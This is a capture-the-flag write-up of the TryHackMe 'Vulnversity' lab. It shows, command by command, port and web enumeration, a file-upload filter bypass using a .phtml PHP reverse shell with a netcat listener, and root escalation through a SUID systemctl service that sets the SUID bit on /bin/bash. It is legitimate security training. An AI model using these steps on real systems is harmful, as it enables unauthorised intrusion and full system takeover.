# TryHackMe - Vulnversity 

### Room Link : [LINK](https://tryhackme.com/room/vulnversity)

## 1. Reconnaissance

I started with RustScan to identify open ports on the target machine.

```bash
rustscan -a 10.48.174.83 -r 1-65535
```

The scan identified six open ports: **21, 22, 139, 445, 3128, and 3333**.

Next, I used Nmap for service and version detection.

```bash
nmap -sC -sV -p21,22,139,445,3128,3333 10.48.174.83
```

Key findings:

- **21/tcp:** FTP — vsftpd 3.0.5
- **22/tcp:** SSH — OpenSSH 8.2p1
- **139/445:** SMB — Samba
- **3128/tcp:** Squid HTTP Proxy
- **3333/tcp:** Apache HTTP Server 2.4.41

The web server on port 3333 hosted a website titled *Vuln University*, making it the primary target for further enumeration.

## 2. Web Enumeration

I used Gobuster to discover hidden directories on the web server.

```bash
gobuster dir -u http://10.48.174.83:3333/ \
-w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
```

The scan revealed several directories, including:

- `/images/`
- `/css/`
- `/js/`
- `/fonts/`
- `/internal/`

Visiting `/internal/` revealed a file upload functionality.

## 3. Exploiting File Upload

I intercepted the file upload request using Burp Suite and modified the request's `Content-Type` header to:

```http
Content-Type: application/x-php
```

I then tested the PHP extensions provided in the lab using Burp Repeater. The `.phtml` extension was accepted, allowing me to upload a PHP payload.

## 4. Obtaining a Reverse Shell

I created a file named `shell.phtml` containing a PHP reverse shell payload. I configured it to connect back to my attacking machine on port `4444`, replacing `YOUR_TUN0_IP` with my VPN interface IP address.

After starting a Netcat listener:

```bash
nc -lvnp 4444
```

I uploaded the payload and accessed it through:

`http://10.48.174.83:3333/internal/uploads/`

The target connected back to my listener, providing a shell as `www-data`.

To improve shell interaction, I spawned a pseudo-terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 5. Capturing the User Flag

After obtaining the shell, I explored the filesystem and found the home directories under `/home`.

The directory `/home/bill/` contained `user.txt`.

```bash
cat /home/bill/user.txt
```

**User flag obtained.**

## 6. Privilege Escalation

To identify potential privilege escalation paths, I searched for SUID binaries.

```bash
find / -type f -perm -4000 2>/dev/null
```

The search revealed `/bin/systemctl`, which was configured with the SUID permission. This provided a potential privilege escalation path because systemctl could execute system-level service operations with elevated privileges.

I created a service unit at `/tmp/test.service` that would execute a command to set the SUID bit on `/bin/bash`.

```ini
[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"

[Install]
WantedBy=multi-user.target
```

I then reloaded the systemd configuration and enabled the service:

```bash
systemctl daemon-reload
systemctl enable --now /tmp/test.service
```

The service executed successfully, setting the SUID bit on `/bin/bash`.

I launched Bash in privileged mode:

```bash
/bin/bash -p
```

Finally, I verified root access and retrieved the root flag.

```bash
whoami
cat /root/root.txt
```

The `whoami` command returned `root`, confirming successful privilege escalation.

